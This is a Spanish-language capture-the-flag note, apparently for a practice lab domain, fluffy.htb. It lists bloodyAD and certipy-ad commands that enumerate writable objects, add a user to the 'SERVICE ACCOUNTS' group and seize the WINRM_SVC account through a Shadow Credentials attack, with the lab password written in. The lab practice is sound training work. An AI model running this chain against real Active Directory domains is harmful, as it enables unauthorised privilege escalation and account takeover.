
### 6️⃣ Comando resumen para flujo completo Para ataque shadow

```bash
# 1. Ver permisos sobre objetos 
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' get writable  

# 2. Listar miembros de un grupo interesante 
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' get groupMember 'SERVICE ACCOUNTS'
  
# 3. Probar añadirte al grupo 
bloodyAD --host 10.10.11.69 -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember 'SERVICE ACCOUNTS' p.agila
  
# 4. Usar Shadow Credentials ahora que tienes privilegios 
sudo certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -account 'WINRM_SVC' -dc-ip '10.10.11.69'
```